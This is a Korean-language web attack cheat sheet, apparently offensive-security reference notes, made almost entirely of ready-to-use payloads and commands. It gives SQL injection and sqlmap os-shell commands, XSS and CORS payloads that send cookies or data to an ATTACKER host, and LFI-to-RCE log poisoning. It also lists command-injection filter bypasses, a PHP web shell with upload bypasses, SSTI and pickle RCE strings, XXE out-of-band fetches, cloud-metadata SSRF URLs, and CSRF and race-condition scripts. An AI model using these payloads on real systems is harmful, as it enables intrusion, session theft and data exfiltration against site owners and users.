# Web 공격

---

## 열거

```bash
# 기술 스택 확인
whatweb http://TARGET
curl -s -I http://TARGET

# 디렉토리
feroxbuster -u http://TARGET -w wordlist -t 50 -d 2 -x php,asp,aspx
ffuf -u http://TARGET/FUZZ -w wordlist -mc 200,301,302,403

# 파라미터
ffuf -u http://TARGET/page?FUZZ=test -w params.txt -fs SIZE
ffuf -u http://TARGET/page -X POST -d "FUZZ=test" -w params.txt -fs SIZE

# 서브도메인
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt -fs SIZE
gobuster vhost -u http://TARGET -w subdomains.txt --append-domain
```

---

## SQLi

```bash
# sqlmap
sqlmap -u 'URL?id=1' --batch --dbs
sqlmap -u 'URL?id=1' -D DB -T TABLE --dump
sqlmap -u 'URL?id=1' --os-shell
sqlmap -u 'URL' --data "user=a&pass=b" --batch                    # POST
sqlmap -u 'URL?id=1' --tamper=space2comment,between --random-agent # WAF

# 수동 페이로드
' OR 1=1-- -
' UNION SELECT NULL,NULL,NULL-- -              # 컬럼 수 확인 (NULL 추가)
' UNION SELECT username,password,NULL FROM users-- -
```

**Blind:**

```sql
-- Time-based
' AND SLEEP(5)-- -                             -- MySQL
'; WAITFOR DELAY '0:0:5'-- -                   -- MSSQL
'; SELECT pg_sleep(5)-- -                      -- PostgreSQL
```

---

## XSS

```html
<script>fetch('http://ATTACKER/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://ATTACKER/?c='+document.cookie)">

<!-- 필터 우회 -->
<svg/onload=fetch('http://ATTACKER/?c='+document.cookie)>
<details open ontoggle=fetch('http://ATTACKER/?c='+document.cookie)>
```

---

## LFI / Path Traversal

```
../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input  (POST로 PHP 코드 전송)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

**Log Poisoning (LFI → RCE):**

```bash
# User-Agent에 PHP 삽입 후 로그 파일 include
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
# 이후 LFI로 로그 include
?page=../../../../var/log/apache2/access.log&cmd=id
```

---

## Command Injection

```bash
; id
| id
$(id)
`id`

# 우회
{cat,/etc/passwd}           # 공백 필터링
cat$IFS/etc/passwd          # $IFS
c'a't /etc/passwd           # 키워드 필터링
```

---

## SSRF

```
http://169.254.169.254/latest/meta-data/        # AWS
http://metadata.google.internal/                 # GCP

# 우회
http://127.1/
http://0x7f000001/
http://0.0.0.0/
http://2130706433/                               # decimal
```

---

## File Upload

```php
<?php system($_GET['cmd']); ?>
```

```bash
# 확장자 우회
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php.png (double ext)

# Apache .htaccess 업로드
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

---

## SSTI

```
# 감지
{{7*7}}  →  49 (Jinja2/Twig)
${7*7}   →  49 (Freemarker/Velocity)

# Jinja2 RCE
{{request.__class__.__mro__[2].__subclasses__()[406]('id',shell=True,stdout=-1).communicate()}}

# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## JWT

```bash
# 디코딩
echo 'JWT_TOKEN' | cut -d. -f2 | base64 -d

# None algorithm
jwt_tool JWT_TOKEN -X a

# Secret 크래킹
hashcat -m 16500 jwt.txt rockyou.txt
```

---

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind OOB -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>
```

---

## Deserialization

```bash
# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections1 "cmd" | base64
# 주요 Gadget: CommonsCollections1-7, Spring1, Groovy1

# PHP
# unserialize() 사용 시 __wakeup(), __destruct() 악용
O:4:"User":1:{s:4:"file";s:11:"/etc/passwd";}

# Python Pickle
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))
pickle.dumps(RCE())

# .NET
ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c whoami"
```

---

## CORS Misconfiguration

```bash
# 확인
curl -s -I -H "Origin: https://evil.com" http://TARGET/ | grep -i access-control

# 취약 조건:
# Access-Control-Allow-Origin: https://evil.com  (임의 Origin 반영)
# Access-Control-Allow-Credentials: true

# 공격 (JavaScript)
# fetch('https://TARGET/api/data', {credentials: 'include'})
#   .then(r => r.text()).then(d => fetch('https://ATTACKER/?d='+btoa(d)))
```

---

## CSRF

```html
<!-- GET -->
<img src="http://TARGET/change?email=attacker@evil.com">

<!-- POST (자동 전송) -->
<form action="http://TARGET/change" method="POST" id="f">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>

<!-- JSON 기반 -->
<script>
fetch('http://TARGET/api/update', {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

---

## Race Condition

```python
# 할인 코드/쿠폰 중복 사용, 잔액 초과 출금 등
import threading, requests

def send():
    requests.post('http://TARGET/transfer', data={'amount': '1000', 'to': 'attacker'}, cookies={'session': 'COOKIE'})

threads = [threading.Thread(target=send) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

```bash
# Turbo Intruder (Burp Suite)
# single-packet attack → HTTP/2 동시 요청
```

---

## GraphQL

```bash
# Introspection
{"query":"{__schema{types{name,fields{name}}}}"}
{"query":"{__schema{queryType{fields{name,args{name}}}}}"}

# 필드 열거
{"query":"{ users { id username email password } }"}

# Batching
[{"query":"{ user(id:1) { password } }"},{"query":"{ user(id:2) { password } }"}]
```

---

## Type Juggling (PHP)

```php
// == (loose) vs === (strict)
// "0e123" == "0e456" → true (과학적 표기법 = 0)
// "0" == false → true
// [] == false → true

// Magic Hash: md5("240610708") = 0e462...
// → password == "0e462..." 이면 "240610708" 입력으로 우회
```

---

## Wordlist / Payload 참고

| 용도 | 경로 |
|------|------|
| 디렉토리 | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| 파일 | `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt` |
| 파라미터 | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` |
| 서브도메인 | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |
| SQLi | `/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` |
| XSS | `/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt` |
| LFI | `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` |
| 비밀번호 | `/usr/share/wordlists/rockyou.txt` |
